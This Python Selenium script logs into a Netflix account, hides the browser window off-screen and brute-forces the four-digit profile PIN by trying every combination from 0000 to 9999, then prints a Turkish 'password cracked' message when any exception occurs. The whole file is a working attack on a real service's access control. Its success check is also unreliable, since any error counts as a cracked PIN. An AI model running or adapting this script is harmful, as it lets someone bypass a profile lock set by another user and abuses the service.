import time

from selenium import webdriver

from selenium.webdriver.chrome.options import Options

from selenium.webdriver.chrome.service import Service

path = "C:\\Users\\Mert Fındıklı\\Desktop\\python\\Selenium Modülü\\chromedriver.exe"
diver = webdriver.Chrome(path)
diver.set_window_position(-10000,0)
diver.get("https://www.netflix.com/browse")

diver.find_element_by_css_selector("input[data-uia='login-field']").send_keys("hesap e postası ")
diver.find_element_by_css_selector("input[data-uia='password-field']").send_keys("hesap Şifresi")
diver.find_element_by_css_selector("button.btn.login-button.btn-submit.btn-small").click()
time.sleep(1)
diver.find_element_by_css_selector("a[data-uia='action-select-profile+primary']").click()

toplam = "0","1","2","3","4","5","6","7","8","9"
try:
    for i in toplam:
        for e in toplam:
            for c in toplam:
                for s in toplam:
                    diver.find_element_by_css_selector("input[data-uia='pin-number-0']").send_keys("{}".format(i))
                    diver.find_element_by_css_selector("input[data-uia='pin-number-1']").send_keys("{}".format(e))
                    diver.find_element_by_css_selector("input[data-uia='pin-number-2']").send_keys("{}".format(c))
                    diver.find_element_by_css_selector("input[data-uia='pin-number-3']").send_keys("{}".format(s))
                    print(i,e,c,s)
except:
    print("Şifre Kırılma Başarılı.....".format())
    time.sleep(5)
    diver.quit()